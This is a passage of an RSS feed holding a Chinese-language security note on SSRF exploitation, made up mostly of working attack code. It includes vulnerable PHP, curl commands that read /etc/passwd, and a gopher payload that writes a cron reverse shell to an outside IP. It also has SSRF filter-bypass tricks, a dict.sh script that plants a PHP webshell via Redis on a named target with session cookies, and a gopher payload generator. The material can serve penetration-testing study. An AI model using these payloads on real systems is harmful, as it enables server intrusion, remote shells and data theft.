/>
&lt;/p>&lt;/p>
&lt;p>&lt;code>file_get_contents()、fsockopen()、curl_exec()、fopen()、readfile()等函数使用不当会造成SSRF漏洞&lt;/code>&lt;/p>
&lt;h3 id="21-ssrf漏洞示例代码">2.1 ssrf漏洞示例代码&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&amp;lt;?php
&lt;span style="color:#8b008b;font-weight:bold">if&lt;/span> (isset(&lt;span style="color:#00688b">$_POST&lt;/span>[&lt;span style="color:#cd5555">&amp;#39;url&amp;#39;&lt;/span>])){
&lt;span style="color:#00688b">$link&lt;/span> = &lt;span style="color:#00688b">$_POST&lt;/span>[&lt;span style="color:#cd5555">&amp;#39;url&amp;#39;&lt;/span>];
&lt;span style="color:#00688b">$curlobj&lt;/span> = curl_init();
curl_setopt(&lt;span style="color:#00688b">$curlobj&lt;/span>, CURLOPT_POST, &lt;span style="color:#b452cd">0&lt;/span>);
curl_setopt(&lt;span style="color:#00688b">$curlobj&lt;/span>,CURLOPT_URL,&lt;span style="color:#00688b">$link&lt;/span>);
curl_setopt(&lt;span style="color:#00688b">$curlobj&lt;/span>, CURLOPT_RETURNTRANSFER, &lt;span style="color:#b452cd">1&lt;/span>);
&lt;span style="color:#00688b">$result&lt;/span>=curl_exec(&lt;span style="color:#00688b">$curlobj&lt;/span>);
curl_close(&lt;span style="color:#00688b">$curlobj&lt;/span>);
&lt;span style="color:#00688b">$filename&lt;/span> = &lt;span style="color:#cd5555">&amp;#39;./curled/&amp;#39;&lt;/span>.rand().&lt;span style="color:#cd5555">&amp;#39;.txt&amp;#39;&lt;/span>;
file_put_contents(&lt;span style="color:#00688b">$filename&lt;/span>, &lt;span style="color:#00688b">$result&lt;/span>);
&lt;span style="color:#8b008b;font-weight:bold">echo&lt;/span> &lt;span style="color:#00688b">$result&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="22-ssrf-利用协议">2.2 ssrf 利用协议&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>file&lt;/code>： 在有回显的情况下，利用 file 协议可以读取任意内容&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">&lt;span style="color:#228b22"># 示例&lt;/span>
curl -vvv &lt;span style="color:#cd5555">&amp;#39;file:///etc/passwd&amp;#39;&lt;/span>
curl -v &lt;span style="color:#cd5555">&amp;#39;http://39.x.x.x:8000/ssrf.php?url=file:///etc/passwd&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>dict&lt;/code>：泄露安装软件版本信息，查看端口，操作内网redis服务等&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">&lt;span style="color:#228b22"># 示例&lt;/span>
curl -v &lt;span style="color:#cd5555">&amp;#39;http://39.x.x.x:8000/ssrf.php?url=dict://127.0.0.1:6379/flushall&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>gopher&lt;/code>：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">&lt;span style="color:#228b22">#示例&lt;/span>
curl -v &lt;span style="color:#cd5555">&amp;#39;http://39.x.x.x:8000/ssrf.php?url=gopher://192.168.1.4:6379/_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f121.36.67.230%2f5555%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>http/s&lt;/code>：探测内网主机存活&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="23-ssrf-绕过方法">2.3 ssrf 绕过方法&lt;/h3>
&lt;ul>
&lt;li>利用 @&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>http://abc@127.0.0.1
实际上是以用户名abc连接到站点127.0.0.1，同理
http://8.8.8.8@127.0.0.1:8080、http://127.0.0.1#8.8.8.8
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>http://www.aaa.com@www.bbb.com@www.ccc.com
在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>利用[::] &lt;code>http://[::]:80/&lt;/code> &amp;raquo;&amp;gt; &lt;code>http://127.0.0.1&lt;/code>&lt;/li>
&lt;li>添加端口号 &lt;code>http://127.0.0.1:8080&lt;/code>&lt;/li>
&lt;li>利用短网址&lt;/li>
&lt;li>利用特殊域名,如&lt;code>127.0.0.1.xip.io&lt;/code>，可解析为&lt;code>127.0.0.1&lt;/code>&lt;/li>
&lt;li>利用DNS解析&lt;/li>
&lt;li>利用进制转换
&lt;pre tabindex="0">&lt;code>127.0.0.1 // 正常模式
0177.0.0.1 // 8进制
0x7f.0.0.1 // 16进制
2130706433 // 10进制
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>句号 &lt;code>127。0。0。1&lt;/code> &amp;raquo;&amp;gt; &lt;code>127.0.0.1&lt;/code>&lt;/li>
&lt;li>302跳转 &lt;code>可使用https://tinyurl.com生成302跳转地址&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="24-dict协议攻击redis为例">2.4 dict协议(攻击redis为例)&lt;/h3>
&lt;ul>
&lt;li>基本信息: &lt;code>dict://127.0.0.1:6379/info&lt;/code>&lt;/li>
&lt;li>清空redis: &lt;code>dict://127.0.1:6379/flushall&lt;/code>&lt;/li>
&lt;li>设置键值对 &lt;code>dict://127.0.0.1:6379/set:webshell:&amp;quot;xxxxx&amp;quot;&lt;/code>
&lt;blockquote>
&lt;p>若字符串中有空格需要将完整字符串用双引号&amp;quot;包起来, 若字符串中带有 ? 等特殊字符, 可转化为十六进制形式&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;li>ascii文本转hex &lt;code>ascii2hex '&amp;lt;?php phpinfo();?&amp;gt;'&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">&lt;span style="color:#658b00">alias&lt;/span> &lt;span style="color:#00688b">ascii2hex&lt;/span>=&lt;span style="color:#cd5555">&amp;#39;_func(){echo &amp;#34;$1&amp;#34; | hexdump -vC | awk &amp;#39;&lt;/span>&lt;span style="color:#cd5555">\&amp;#39;&lt;/span>&lt;span style="color:#cd5555">&amp;#39;BEGIN {IFS=&amp;#34;\t&amp;#34;} {$1=&amp;#34;&amp;#34;; print }&amp;#39;&lt;/span>&lt;span style="color:#cd5555">\&amp;#39;&lt;/span>&lt;span style="color:#cd5555">&amp;#39; | awk &amp;#39;&lt;/span>&lt;span style="color:#cd5555">\&amp;#39;&lt;/span>&lt;span style="color:#cd5555">&amp;#39;{sub(/\|.*/,&amp;#34;&amp;#34;)}1&amp;#39;&lt;/span>&lt;span style="color:#cd5555">\&amp;#39;&lt;/span>&lt;span style="color:#cd5555">&amp;#39; | tr -d &amp;#39;&lt;/span>&lt;span style="color:#cd5555">\&amp;#39;&lt;/span>&lt;span style="color:#cd5555">&amp;#39;\n&amp;#39;&lt;/span>&lt;span style="color:#cd5555">\&amp;#39;&lt;/span>&lt;span style="color:#cd5555">&amp;#39;|sed &amp;#39;&lt;/span>&lt;span style="color:#cd5555">\&amp;#39;&lt;/span>&lt;span style="color:#cd5555">&amp;#39;s/ / /g&amp;#39;&lt;/span>&lt;span style="color:#cd5555">\&amp;#39;&lt;/span>&lt;span style="color:#cd5555">&amp;#39; |sed &amp;#39;&lt;/span>&lt;span style="color:#cd5555">\&amp;#39;&lt;/span>&lt;span style="color:#cd5555">&amp;#39;s/ /\\x/g&amp;#39;&lt;/span>&lt;span style="color:#cd5555">\&amp;#39;&lt;/span>&lt;span style="color:#cd5555">&amp;#39;|rev|cut -c 3- |rev }; _func&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>攻击脚本 &lt;code>dict.sh&lt;/code>, 某网站暴露ssrf漏洞参数 &lt;code>reply_image&lt;/code>, 如下脚本通过多次 post, 通过 dict, 攻击 redis 写入一句话脚本&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">&lt;span style="color:#1e889b">#!/bin/bash
&lt;/span>&lt;span style="color:#1e889b">&lt;/span>curl &lt;span style="color:#cd5555">&amp;#39;http://www.xxxxxxxx.com/mp/mp/addKeyword&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> -H &lt;span style="color:#cd5555">&amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> -H &lt;span style="color:#cd5555">&amp;#39;Cookie: think_admin=think%3A%7B%22id%22%3A%221%22%2C%22admin_name%22%3A%22zhoulin1230%22%2C%22password%22%3A%22c843af71dc17c2e605946aa6f5346f0e%22%2C%22status%22%3A%221%22%2C%22ip%22%3A%2227.26.220.222%22%2C%22last_time%22%3A%221592559280%22%2C%22rand_str%22%3A%22TOdLnC%22%2C%22admin_id%22%3A%221%22%7D; PHPSESSID=i4tl25v8f369muq7qeddv6out3&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> --data-raw &lt;span style="color:#cd5555">&amp;#39;keyword=abc&amp;amp;type=image&amp;amp;reply_image=dict://redis:6379/flushall&amp;amp;image_staus_type=0&amp;#39;&lt;/span>
curl &lt;span style="color:#cd5555">&amp;#39;http://www.xxxxxxxx.com/mp/mp/addKeyword&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> -H &lt;span style="color:#cd5555">&amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> -H &lt;span style="color:#cd5555">&amp;#39;Cookie: think_admin=think%3A%7B%22id%22%3A%221%22%2C%22admin_name%22%3A%22zhoulin1230%22%2C%22password%22%3A%22c843af71dc17c2e605946aa6f5346f0e%22%2C%22status%22%3A%221%22%2C%22ip%22%3A%2227.26.220.222%22%2C%22last_time%22%3A%221592559280%22%2C%22rand_str%22%3A%22TOdLnC%22%2C%22admin_id%22%3A%221%22%7D; PHPSESSID=i4tl25v8f369muq7qeddv6out3&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> --data-raw &lt;span style="color:#cd5555">&amp;#39;keyword=abc&amp;amp;type=image&amp;amp;reply_image=dict://redis:6379/set:webshell:&amp;#34;\\x3c\\x3f\\x70\\x68\\x70\\x20\\x70\\x68\\x70\\x69\\x6e\\x66\\x6f\\x28\\x29\\x3b\\x20\\x65\\x78\\x69\\x74\\x3b\\x3f\\x3e\\x0a&amp;#34;&amp;amp;image_staus_type=0&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span>
curl &lt;span style="color:#cd5555">&amp;#39;http://www.xxxxxxxx.com/mp/mp/addKeyword&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> -H &lt;span style="color:#cd5555">&amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> -H &lt;span style="color:#cd5555">&amp;#39;Cookie: think_admin=think%3A%7B%22id%22%3A%221%22%2C%22admin_name%22%3A%22zhoulin1230%22%2C%22password%22%3A%22c843af71dc17c2e605946aa6f5346f0e%22%2C%22status%22%3A%221%22%2C%22ip%22%3A%2227.26.220.222%22%2C%22last_time%22%3A%221592559280%22%2C%22rand_str%22%3A%22TOdLnC%22%2C%22admin_id%22%3A%221%22%7D; PHPSESSID=i4tl25v8f369muq7qeddv6out3&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> --data-raw &lt;span style="color:#cd5555">&amp;#39;keyword=abc&amp;amp;type=image&amp;amp;reply_image=dict://redis:6379/config:set:dir:&amp;#34;/www/wwwroot/www.xxxxxxxx.com&amp;#34;&amp;amp;image_staus_type=0&amp;#39;&lt;/span>
curl &lt;span style="color:#cd5555">&amp;#39;http://www.xxxxxxxx.com/mp/mp/addKeyword&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> -H &lt;span style="color:#cd5555">&amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> -H &lt;span style="color:#cd5555">&amp;#39;Cookie: think_admin=think%3A%7B%22id%22%3A%221%22%2C%22admin_name%22%3A%22zhoulin1230%22%2C%22password%22%3A%22c843af71dc17c2e605946aa6f5346f0e%22%2C%22status%22%3A%221%22%2C%22ip%22%3A%2227.26.220.222%22%2C%22last_time%22%3A%221592559280%22%2C%22rand_str%22%3A%22TOdLnC%22%2C%22admin_id%22%3A%221%22%7D; PHPSESSID=i4tl25v8f369muq7qeddv6out3&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> --data-raw &lt;span style="color:#cd5555">&amp;#39;keyword=abc&amp;amp;type=image&amp;amp;reply_image=dict://redis:6379/config:set:dbfilename:&amp;#34;test.php&amp;#34;&amp;amp;image_staus_type=0&amp;#39;&lt;/span>
curl &lt;span style="color:#cd5555">&amp;#39;http://www.xxxxxxxx.com/mp/mp/addKeyword&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> -H &lt;span style="color:#cd5555">&amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> -H &lt;span style="color:#cd5555">&amp;#39;Cookie: think_admin=think%3A%7B%22id%22%3A%221%22%2C%22admin_name%22%3A%22zhoulin1230%22%2C%22password%22%3A%22c843af71dc17c2e605946aa6f5346f0e%22%2C%22status%22%3A%221%22%2C%22ip%22%3A%2227.26.220.222%22%2C%22last_time%22%3A%221592559280%22%2C%22rand_str%22%3A%22TOdLnC%22%2C%22admin_id%22%3A%221%22%7D; PHPSESSID=i4tl25v8f369muq7qeddv6out3&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> --data-raw &lt;span style="color:#cd5555">&amp;#39;keyword=abc&amp;amp;type=image&amp;amp;reply_image=dict://redis:6379/save&amp;amp;image_staus_type=0&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="25-gopher协议">2.5 gopher协议&lt;/h3>
&lt;ul>
&lt;li>有时服务端在接收参数时,会对参数进行一次 &lt;code>urldecode&lt;/code>, 因此可能需要对 &lt;code>gopher&lt;/code> 进行连续两次 &lt;code>urlencode&lt;/code>&lt;/li>
&lt;li>gopher生成脚本 &lt;code>gopher.py&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">import urllib
&lt;span style="color:#00688b">protocol&lt;/span>=&lt;span style="color:#cd5555">&amp;#34;gopher://&amp;#34;&lt;/span>
&lt;span style="color:#00688b">ip&lt;/span>=&lt;span style="color:#cd5555">&amp;#34;redis&amp;#34;&lt;/span>
&lt;span style="color:#00688b">port&lt;/span>=&lt;span style="color:#cd5555">&amp;#34;6379&amp;#34;&lt;/span>
&lt;span style="color:#00688b">shell&lt;/span>=&lt;span style="color:#cd5555">&amp;#34;\n\n&amp;lt;?php phpinfo();?&amp;gt;\n\n&amp;#34;&lt;/span>
&lt;span style="color:#00688b">filename&lt;/span>=&lt;span style="color:#cd5555">&amp;#34;shell.php&amp;#34;&lt;/span>
&lt;span style="color:#00688b">path&lt;/span>=&lt;span style="color:#cd5555">&amp;#34;/data&amp;#34;&lt;/span>
&lt;span style="color:#00688b">passwd&lt;/span>=&lt;span style="color:#cd5555">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00688b">cmd&lt;/span>=[&lt;span style="color:#cd5555">&amp;#34;flushall&amp;#34;&lt;/span>
&lt;span style="color:#cd5555">&amp;#34;set 1 {}&amp;#34;&lt;/span>.format(shell.replace(&lt;span style="color:#cd5555">&amp;#34; &amp;#34;&lt;/span>,&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">${&lt;/span>&lt;span style="color:#00688b">IFS&lt;/span>&lt;span style="color:#cd5555">}&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>)),
&lt;span style="color:#cd5555">&amp;#34;config set dir {}&amp;#34;&lt;/span>.format(path),
&lt;span style="color:#cd5555">&amp;#34;config set dbfilename {}&amp;#34;&lt;/span>.format(filename),
&lt;span style="color:#cd5555">&amp;#34;save&amp;#34;&lt;/span>
]
cmd.insert(0,&lt;span style="color:#cd5555">&amp;#34;AUTH {}&amp;#34;&lt;/span>.format(passwd))
&lt;span style="color:#00688b">payload&lt;/span>=protocol+ip+&lt;span style="color:#cd5555">&amp;#34;:&amp;#34;&lt;/span>+port+&lt;span style="color:#cd5555">&amp;#34;/_&amp;#34;&lt;/span>
def redis_format(arr):
&lt;span style="color:#00688b">CRLF&lt;/span>=&lt;span style="color:#cd5555">&amp;#34;\r\n&amp;#34;&lt;/span>
&lt;span style="color:#00688b">redis_arr&lt;/span> = arr.split(&lt;span style="color:#cd5555">&amp;#34; &amp;#34;&lt;/span>)
&lt;span style="color:#00688b">cmd&lt;/span>=&lt;span style="color:#cd5555">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00688b">cmd&lt;/span>+=&lt;span style="color:#cd5555">&amp;#34;*&amp;#34;&lt;/span>+str(len(redis_arr))
&lt;span style="color:#8b008b;font-weight:bold">for&lt;/span> x in redis_arr:
&lt;span style="color:#00688b">cmd&lt;/span>+=CRLF+&lt;span style="color:#cd5555">&amp;#34;&lt;/span>$&lt;span style="color:#cd5555">&amp;#34;&lt;/span>+str(len((x.replace(&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">${&lt;/span>&lt;span style="color:#00688b">IFS&lt;/span>&lt;span style="color:#cd5555">}&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>,&lt;span style="color:#cd5555">&amp;#34; &amp;#34;&lt;/span>))))+CRLF+x.replace(&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">${&lt;/span>&lt;span style="color:#00688b">IFS&lt;/span>&lt;span style="color:#cd5555">}&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>,&lt;span style="color:#cd5555">&amp;#34; &amp;#34;&lt;/span>)
&lt;span style="color:#00688b">cmd&lt;/span>+=CRLF
&lt;span style="color:#8b008b;font-weight:bold">return&lt;/span> cmd
&lt;span style="color:#8b008b;font-weight:bold">for&lt;/span> x in cmd:
&lt;span style="color:#cd5555">&amp;#39;&amp;#39;&amp;#39; 如果需要两次url编码, 则再调一次urllib.quote() &amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#00688b">payload&lt;/span> += urllib.quote(urllib.quote(redis_format(x)))
print payload
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul></description></item><item><title>Docs: Exploit</title><link>https://note.codiy.net/docs/security/exploit/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://note.codiy.net/docs/security/exploit/</guid><description/></item></channel></rss>